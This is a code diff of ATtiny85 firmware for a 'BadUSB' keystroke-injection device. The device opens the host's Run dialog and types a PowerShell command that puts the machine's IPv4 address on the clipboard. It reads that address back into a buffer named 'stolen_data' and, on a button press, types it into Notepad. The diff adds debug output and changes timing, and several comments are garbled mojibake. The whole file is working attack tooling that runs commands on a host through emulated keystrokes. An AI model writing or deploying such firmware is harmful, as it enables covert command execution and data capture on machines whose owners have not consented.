@@ -1,5 +1,5 @@
 /*******************************************************
-Project : Real BadUSB Final Fix v2
+Project : Debugged BadUSB Final
 Chip    : ATtiny85
 Clock   : 8.000000 MHz
 *******************************************************/
@@ -15,10 +15,10 @@ Clock   : 8.000000 MHz
 #define BTN_DDR DDRB.4
 #define BTN_PORT PORTB.4
 
-#define BIT_DELAY_US 104 
-#define HALF_BIT_DELAY_US 52
+#define BIT_DELAY_US 208    
+#define HALF_BIT_DELAY_US 104 
 
-char stolen_data[32]; 
+char stolen_data[35]; 
 
 void uart_tx(char data) {
     unsigned char i;
@@ -55,34 +55,39 @@ char uart_rx(void) {
 }
 
 flash char CMD_RUN[] = "CMD:RUN\n";
-flash char CMD_GET_IP[] = "TYPE:powershell \"Set-Clipboard -Value (Get-NetIPAddress -AddressFamily IPv4).IPAddress[0]\"\n"; 
 flash char KEY_ENTER[] = "KEY:ENTER\n";
-flash char CMD_ASK_DATA[] = "ACTION:GET_CLIP\n";
-flash char HEADER_TEXT[] = "TYPE:Extracted IP: \n";
-// *** «÷«›Â ‘œÂ: ÅÌ‘Ê‰œ  «ÌÅ ***
-flash char CMD_TYPE_PREFIX[] = "TYPE:";
 
 void main(void) {
     int i;
     
+
     TX_DDR = 1; TX_PIN = 1;
     RX_DDR = 0; 
-    BTN_DDR = 0; BTN_PORT = 1;
+    BTN_DDR = 0; BTN_PORT = 1; 
 
-    delay_ms(1000);
+    delay_ms(500);
 
-    // --- ›«“ 1: Õ„·Â ---
+  
+    uart_print_flash("DEBUG: *** BOOTING UP ***\n");
+
+    
+    uart_print_flash("DEBUG:Phase 1 - Getting IP\n");
+    
     uart_print_flash(CMD_RUN);
     delay_ms(500);
-    uart_print_flash(CMD_GET_IP);
+   
+    uart_print_flash("TYPE:powershell \"Set-Clipboard -Value (Get-NetIPAddress -AddressFamily IPv4).IPAddress[0]\"\n");
     delay_ms(500);
     uart_print_flash(KEY_ENTER);
-    delay_ms(2500); 
+    
+    delay_ms(3000); 
 
-    uart_print_flash(CMD_ASK_DATA);
+    uart_print_flash("ACTION:GET_CLIP\n");
 
-    for(i=0; i<32; i++) stolen_data[i] = 0;
+    
+    for(i=0; i<35; i++) stolen_data[i] = 0;
 
+    
     for(i=0; i<30; i++) {
         char c = uart_rx();
         if(c == '\n' || c == '\r') {
@@ -91,34 +96,39 @@ void main(void) {
         }
         stolen_data[i] = c;
     }
+    
+    uart_print_flash("DEBUG: IP Saved. Entering Phase 2 (Loop).\n");
 
-    // --- ›«“ 2: œò„Â ---
+    
     while (1) {
+        
         if (BTN_PIN == 0) {
-            delay_ms(50);
+            delay_ms(50); 
             if (BTN_PIN == 0) {
-                // »«“ ò—œ‰ ‰Ê  Åœ
+               
+                uart_print_flash("DEBUG:Button Pressed!\n");
+                
+             
                 uart_print_flash(CMD_RUN);
                 delay_ms(500);
                 uart_print_flash("TYPE:notepad\n");
                 delay_ms(100);
                 uart_print_flash(KEY_ENTER);
-                delay_ms(1000);
+                
+                delay_ms(1000); 
+                uart_print_flash("TYPE:Your IP is: ");
+                uart_print_ram(stolen_data);
+                uart_print_flash("\n");
+                
+                uart_print_flash("DEBUG:Done Typing. Release Button.\n");
 
-                    // --- ›«“ 1: Õ„·Â ---
-    uart_print_flash(CMD_RUN);
-    delay_ms(500);
-    uart_print_flash(CMD_GET_IP);
-    delay_ms(500);
-    uart_print_flash(KEY_ENTER);
-    
-    // ***  €ÌÌ— „Â„: «›“«Ì‘ “„«‰ ’»— »Â 5 À«‰ÌÂ ***
-    // «Ì‰ »Â Å«Ê—‘· «Ã«“Â „ÌœÂœ ò«„· ·Êœ ‘Êœ Ê œ” Ê— —« «Ã—« ò‰œ
-    delay_ms(5000); 
-
-    uart_print_flash(CMD_ASK_DATA);
-
-                while (BTN_PIN == 0); 
+            
+                while(BTN_PIN == 0) {
+                    delay_ms(10);
+                }
+                
+                uart_print_flash("DEBUG:Button Released. Waiting...\n");
+                delay_ms(500);
             }
         }
     }
